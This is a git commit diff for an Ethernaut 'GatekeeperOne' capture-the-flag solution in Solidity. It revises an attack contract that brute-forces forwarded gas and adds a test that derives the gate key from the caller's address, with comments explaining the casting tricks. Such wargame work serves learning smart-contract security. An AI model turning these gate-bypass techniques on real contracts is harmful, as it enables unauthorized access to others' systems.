23968d14e684c51c06f2481ba244078f564f43fb
sofinico <nicolettisofia1@gmail.com>
2024-05-15 20:31:05 +0200

    level: GatekeeperOne

--- src/attacks/GatekeeperOneSolution.sol
+++ src/attacks/GatekeeperOneSolution.sol
@@ -4,10 +4,10 @@ pragma solidity ^0.8.0;
 contract GatekeeperOneSolution {
     address public owner;
     address public gatekeeperOne;
-    
-    event ForwardedGas(uint);
 
-    modifier onlyOwner {
+    event GasOffset(uint);
+
+    modifier onlyOwner() {
         require(msg.sender == owner, "Not owner");
         _;
     }
@@ -17,18 +17,24 @@ contract GatekeeperOneSolution {
         gatekeeperOne = _gatekeeperOne;
     }
 
-    function makeEntrant(bytes8 _gateKey, uint multiplier) onlyOwner public returns (uint){
+    function makeEntrant(
+        bytes8 _gateKey,
+        uint multiplier
+    ) public onlyOwner returns (uint) {
         bool success = false;
-        uint forwardedGas = multiplier*8191;
+        uint offset;
 
-        while (!success) {
-            (success,) = gatekeeperOne.call{gas: forwardedGas}(
+        while ((!success) && (offset < 500)) {
+            (success, ) = gatekeeperOne.call{gas: multiplier * 8191 + offset}(
                 abi.encodeWithSignature("enter(bytes8)", _gateKey)
             );
-            forwardedGas++;
+            offset++;
         }
 
-        emit ForwardedGas(forwardedGas-1);
-        return forwardedGas-1;
+        /// @dev This is just for curiosity purpose. Wanted to know which was the actual offset on Sepolia.
+        emit GasOffset(offset);
+
+        /// @dev Returned value is easier to handle in testing environment.
+        return offset;
     }
 }
--- test/GatekeeperOne.t.sol
+++ test/GatekeeperOne.t.sol
@@ -18,7 +18,7 @@ contract TestGatekeeperOne is Test, Utils {
     address payable owner;
     address payable player;
 
-    bytes8 constant GATEKEY = 0x0023caca00001f38;
+    bytes8 gateKey;
 
     /// @notice Create level instance.
     function setUp() public {
@@ -37,8 +37,13 @@ contract TestGatekeeperOne is Test, Utils {
         vm.stopPrank();
 
         vm.startPrank(player);
-        instance = GatekeeperOne(payable(createLevelInstance(ethernaut, Level(address(factory)), 0)));
+        instance = GatekeeperOne(
+            payable(createLevelInstance(ethernaut, Level(address(factory)), 0))
+        );
         vm.stopPrank();
+
+        // let's create the gate key
+        gateKey = createKey(player);
     }
 
     /// @notice Check the intial state of the level and enviroment.
@@ -49,17 +54,56 @@ contract TestGatekeeperOne is Test, Utils {
 
     /// @notice Test the solution for the level.
     function testSolve() public {
-        vm.startPrank(player);
-        GatekeeperOneSolution solution = new GatekeeperOneSolution(address(instance));
-        
+        /// @notice This is the minimum multiplier possible.
         uint multiplier = 3;
-        uint ans = solution.makeEntrant(GATEKEY, multiplier);
+        
+        vm.prank(player);
+        GatekeeperOneSolution solution = new GatekeeperOneSolution(
+            address(instance)
+        );
 
-        console.log("Total forwarded gas to GatekeeperOne.entrant(): %s", ans);
-        console.log("Total consumed gas until gasleft(): %s", ans - multiplier*8191);
-
+        vm.prank(player, player);
+        uint offset = solution.makeEntrant(gateKey, multiplier);
         assertEq(instance.entrant(), player, "Player is not entrant.");
+
+        vm.prank(player);
         assertTrue(submitLevelInstance(ethernaut, address(instance)));
-        vm.stopPrank();
+
+        console.log("Total consumed gas until gasleft(): %s", offset);
+    }
+
+    function createKey(address origin) private pure returns (bytes8) {
+        /**
+        Solidity uses hexadecimal notation for defining bytes values. In particular, the gate key is a bytes8 type.
+        Let's deduce the requirements of gateThree modifier to create the opening gatekey.
+
+        1. First require: uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
+       
+        Note casting bytesN values into a smaller bytesM type in Solidity (N > M), keeps the first bytes and truncates 
+        the last ones. But for N-bit binary values, is the opposite. When converting from a larger integer type into a 
+        smaller one, the bits on the right are kept while the bits on the left are lost. 
+        
+        So here, since we are casting integer types, the "last" 16 bits can be anything and bits in positions [16; 32) 
+        (from right to left) must be zero in order to accomplish the condition. 
+
+        Current array of bytes: [?, ?, ?, ?, 0, 0, X, Y]
+
+        2. Second require: uint32(uint64(_gateKey)) != uint64(_gateKey)
+        
+        This means the obtained casted uint64 number cannot be represented as a uint32 due to it size. So at least one 
+        bit in position [32; 64) (from right to left) has to be 1. 
+
+        Current array of bytes: [A, 0, 0, 0, 0, 0, X, Y] or [0, A, 0, 0, 0, 0, X, Y] or ...
+
+        3. Third require: uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))
+
+        This is nice. Here we are constraining X and Y values ("last" 16 bits) in order to match "last" 2 bytes of an 
+        arbitrary address.
+         */
+
+        // 2**60 was chosen randomly, it can be any number from 2**32 to 2**64 - 1 inclusive.
+        bytes8 key = bytes8(uint64(uint16(uint160(origin))) + 2 ** 60);
+
+        return key;
     }
 }
